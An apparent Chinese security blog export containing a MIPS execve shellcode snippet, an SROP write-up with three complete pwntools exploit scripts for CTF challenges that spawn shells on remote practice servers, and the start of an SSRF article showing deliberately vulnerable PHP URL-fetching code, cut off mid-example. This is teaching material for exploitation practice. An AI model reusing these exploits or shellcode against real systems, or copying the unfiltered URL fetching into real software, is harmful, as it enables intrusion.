<h3 id="execve系统调用"><a href="#execve系统调用" class="headerlink" title="execve系统调用"></a>execve系统调用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    addiu $sp,$sp,-0x10</span><br><span class="line">    li $t0,0x2f62696e #/bin</span><br><span class="line">    li $t1,0x2f2f7368 #//sh</span><br><span class="line">    sw $t0,0x8($sp)</span><br><span class="line">    sw $t1,0xc($sp)</span><br><span class="line">    la $a0,0x8($sp)</span><br><span class="line">    addi $a1,$zero,0</span><br><span class="line">    addi $a2,$zero,0</span><br><span class="line">    addi $v0,$zero,4011</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>上面这段代码需要开辟栈帧，借助栈来传递字符串<code>/bin//sh</code>的地址给<code>$a0</code>寄存器，也可以通过<code>.byte</code>指令将<code>/bin//sh</code>字符串放在自定义的标签中（注意字符串后面要00截断，不然后面可能会带上其他字符），然后直接<code>la</code>标签的地址给<code>$a0</code>寄存器，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line"># /bin//sh\x00</span><br><span class="line">some_label: .byte 0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x00</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    la $a0,some_label</span><br><span class="line">    addi $a1,$zero,0</span><br><span class="line">    addi $a2,$zero,0</span><br><span class="line">    addi $v0,$zero,4011</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>可以借助这个网站<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler</a>，查看汇编代码对应的机器码。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">《IoT从入门到入土》(1)–MIPS交叉编译环境搭建及其32位指令集</a></p>
<p><a href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">路由器漏洞分析环境搭建 | Prowes5’s Blog</a></p>
<p><a href="https://zikh26.github.io/posts/919c29c4.html">IOT安全入门学习–MIPS汇编基础 | ZIKH26’s Blog</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-273522.htm#msg_header_h1_4">原创]IDA及插件MIPSROP安装——《揭秘家用路由器0day漏洞挖掘技术》学习笔记-安全工具-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://gdufs-king.github.io/2021/06/08/ida%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E8%B8%A9%E5%9D%91%E7%BB%8F%E5%8E%86/">ida插件安装踩坑经历 - V1ct0r的博客</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SROP总结</title>
    <url>/2024/01/22/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​	<code>ROP(Return Oriented Programming)</code>是利用程序中的一系列<code>ret</code>指令来构造恶意代码执行链。而<code>SROP</code>即利用<code>sigreturn</code>函数完成以上内容。</p>
<span id="more"></span>

<p>这里放一张我看其他师傅博客上的一张图，完成一次系统调用的过程如下：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908627.png" alt="image-20240122163354902"></p>
<p>①：用户态进程接收到信号<code>signal</code>，该进程被挂起，进入内核态。</p>
<p>②：内核保存用户态进程的上下文，然后跳转到用户态的信号<code>signal</code>对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户栈上的<code>Signal Frame</code>用于存放该进程的上下文，然后再<code>push</code>返回地址<code>rt_sigreturn</code>。</p>
<p>③：用户态的信号处理程序执行完毕，<code>pop</code>返回地址<code>rt_sigreturn</code>，进程进入内核态，执行<code>sigreturn</code>系统调用。内核根据之前栈上的<code>Signal Frame</code>完成用户态进程上下文的恢复。</p>
<p>④：返回用户态，进程按照恢复的上下文继续执行。</p>
<p>​	<code>SROP</code>作用于第3阶段，也就是内核根据<code>Signal Frame</code>的内容恢复进程上下文的过程。</p>
<p>​	<code>Signal Frame</code>（类似下面这张图）是一个已知的数据结构，而且其存在于用户态的栈上。内核在恢复上下文时并不能确保其内容没有被修改过。因此，如果我们能够在栈上构造<code>sigreturn</code>系统调用与新的<code>Signal Frame</code>结构体的话，就能够实现攻击的效果。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908826.png" alt="image-20240122203103809"></p>
<p>​	<code>sigreturn</code>函数用于从信号处理程序中恢复到原始的系统调用状态，调用号为<code>0xf</code>，通过<code>syscall</code>指令直接调用。在<code>x86-64</code>架构的<code>Linux</code>系统中，<code>syscall</code>指令的调用号存储在寄存器<code>rax</code>中。</p>
<h2 id="srop的做题条件"><a href="#srop的做题条件" class="headerlink" title="srop的做题条件"></a><code>srop</code>的做题条件</h2><ul>
<li>一定要能调用<code>sigreturn</code>，也就是说程序中要有<code>syscall</code>的指令并知道其地址，还需要让<code>rax</code>寄存器值为<code>0xf</code>。</li>
<li>必须要能知道<code>/bin/sh</code>在程序中的地址。</li>
</ul>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a><code>ciscn_2019_es_7</code></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	系统调用了<code>sys_read</code>和<code>sys_write</code>，并且可以溢出<code>0x400-0x10</code>个字节</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png" alt="image-20240122163539371"></p>
<p>​	我们看到<code>mov rax,0fh;retn</code>的<code>gadget</code>，<code>0fh</code>是<code>sigreturn</code>函数的调用号，可以用<code>SROP</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908087.png" alt="image-20240122152721309"></p>
<p>​	程序中没有<code>/bin/sh</code>，我们可以在<code>sys_read(0,buf,0x400ull)</code>这一过程中先把<code>/bin/sh</code>写到<code>buf</code>中，然后<code>sys_write(1u,buf,0x30ull)</code>这一过程会把<code>buf</code>及后面的内容共<code>0x30</code>个字节打印出来，这样我们就可以泄漏一个栈地址，然后计算其与<code>/bin/sh</code>的地址的偏移，表示出<code>/bin/sh</code>的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line">binsh_addr = one_addr-<span class="number">0x148</span></span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>

<p>​	得到<code>/bin/sh</code>的地址后，构造一个<code>execve</code>的<code>signal frame</code>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = binsh_addr  <span class="comment">#第一个参数</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#下面解释</span></span><br></pre></td></tr></table></figure>

<p>​	首先我们要知道，<code>rip</code>是一个指令指针的寄存器，也就是说<code>rip</code>寄存器中存放的是要执行的下一条指令的地址。而<code>frame.rip</code>中存放的是 当<code>sigreturn</code>系统调用返回后要执行的下一条指令的地址。这里的<code>frame.rip = syscall_leave_ret</code>就表示我们将要执行<code>syscall</code>指令，又因为我们已经设置了<code>execve</code>的<code>signal frame</code>，所以我们就控制了程序的执行流执行<code>execve</code>系统调用。</p>
<p>​	构造第二个<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr)  <span class="comment">#sigreturn的调用号是0xf</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>​	一开始我把<code>payload = payload = b&#39;/bin/sh\x00&#39;.ljust(16,b&#39;\x00&#39;)</code>写成<code>payload = b&#39;a&#39;*16</code>打不通。调试的时候发现，<code>vuln</code>函数是又被循环了一次，这个<code>payload</code>是会往<code>buf</code>中写覆盖原来的内容，也就是说我们上面泄漏的地址<code>binsh_addr</code>，中的内容会变成这次发送的前<code>8</code>个字节。所以我们构造的<code>payload</code>的前<code>8</code>个字节必须是<code>/bin/sh\x00</code>。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26868</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es7&#x27;)</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x148</span></span><br><span class="line">binsh_addr = one_addr-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="comment">#0x148是本地的偏移量，远程的应该是0x118，本地与远程的libc不同</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_addr </span><br><span class="line"></span><br><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr) </span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908737.png" alt="image-20240122171324394"></p>
<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a><code>rootersctf_2019_srop</code></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	我们分析代码，发现连<code>main</code>函数都没有，整个程序就是先<code>call 0x401000</code>，然后<code>exit</code>退出。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909604.png" alt="image-20240206133317497"></p>
<p>​	跳到地址为<code>0x401000</code>这里，分析汇编代码，<code>2</code>个系统调用，<code>write(1,buf,0x2a),read(0,rsp-0x40,0x400)</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909651.png" alt="image-20240206132903020"></p>
<p>​	程序中没有<code>/bin/sh</code>，所以我们要先往一个地址中写入<code>/bin/sh</code>。如果我们直接写入<code>/bin/sh</code>再<code>srop</code>，我们不能知道<code>/bin/sh</code>的地址，所以可以先栈迁移到<code>data</code>段，<code>data</code>段的地址已知且不变，这样我们就拿到<code>/bin/sh</code>的地址了，设置<code>read</code>的一些寄存器值，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  <span class="comment">#read的系统调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span>  <span class="comment">#标准输入</span></span><br><span class="line">frame.rsi = buf_addr  <span class="comment">#写入的位置的起始地址</span></span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#可以写入的字节个数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#syscall系统调用read</span></span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>不过这里<code>frame.rbp = buf_addr+0x20</code>的作用是什么？）</p>
<p>​	然后我们可以构造第一个<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>​	上面构造的<code>signal frame</code>再次<code>syscall</code>了一个<code>read</code>系统调用，下面我们就可以往<code>buf_addr = 0x402000</code>里写入<code>/bin/sh</code>，并再次构造一个<code>signal frame</code>系统调用<code>execve</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = buf_addr  <span class="comment">#/bin/sh的地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#</span></span><br><span class="line"><span class="comment">#frame.rbp =   #没有rbp了</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./srop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26592</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = buf_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909642.png" alt="image-20240206160012074"></p>
<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a><code>360chunqiu2017_smallest</code></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>我们每次控制寄存器的时候，都把<code>rsp</code>写成下一个片段的<code>rt_sigreturn</code>的地址，并且<code>rip</code>的地址要指向<code>syscall；ret</code> 一定要后面有<code>ret</code>，不然所有的片段连不起来，到<code>ret</code>的时候，就会去执行<code>rsp</code>执行的地址，因此我们就可以一直劫持程序的控制流。</p>
<p>​	程序很简单，只有下面一个函数，分析一下代码就是一个<code>read</code>系统调用，可以栈溢出并且能够溢出的字节数很长。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;retaddr, <span class="number">0x400u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909763.png" alt="image-20240207130130852"></p>
<p>​	这道题既然是用<code>srop</code>，那么必然是需要能够调用<code>sigreturn</code>，也就是需要把<code>rax</code>寄存器的值设置为<code>0xf</code>。我们发现并没有能够实现这个的相关的<code>gadget</code>，但是我们突然想到<code>read</code>返回值就是存储在<code>rax</code>寄存器中的，我们可以利用这个来设置<code>rax</code>寄存器的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29210</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smallest&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = target_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_ret_addr  </span><br><span class="line">frame.rsp = target_addr  </span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">binsh_addr = target_addr+<span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  </span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_ret_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909062.png" alt="image-20240219151202950"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>SROP</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞总结</title>
    <url>/2024/09/10/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<span id="more"></span>

<h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
<h2 id="漏洞产生函数"><a href="#漏洞产生函数" class="headerlink" title="漏洞产生函数"></a>漏洞产生函数</h2><p><strong><code>file_get_contents</code></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>

<p><strong><code>fsockopen</code></strong></p>
<p>该函数在PHP中用于打开一个网络连接或者一个Unix套接字连接。进而来获取用户指定的url数据，其使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFsock</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;连接失败: <span class="subst">$errno</span> - <span class="subst">$errstr</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;   <span class="comment">//构造$out,设置请求头</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">            <span class="variable">$contents</span> .= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">GetFsock</span>(<span class="string">&quot;192.168.1.12&quot;</span>, <span class="number">80</span>, <span class="string">&quot;/eclipse_workspace/firstpro/flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>curl_exec</code></strong></p>
<p>该函数用于执行由<code>curl_init</code>初始化的cURL会话。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CurlExec</span>(<span class="params"><span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();   <span class="comment">//初始化cURL会话</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">0</span>);   <span class="comment">//设置为 0，表示使用 GET 方法请求数据。</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$link</span>);   <span class="comment">//设置要请求的 URL。</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span 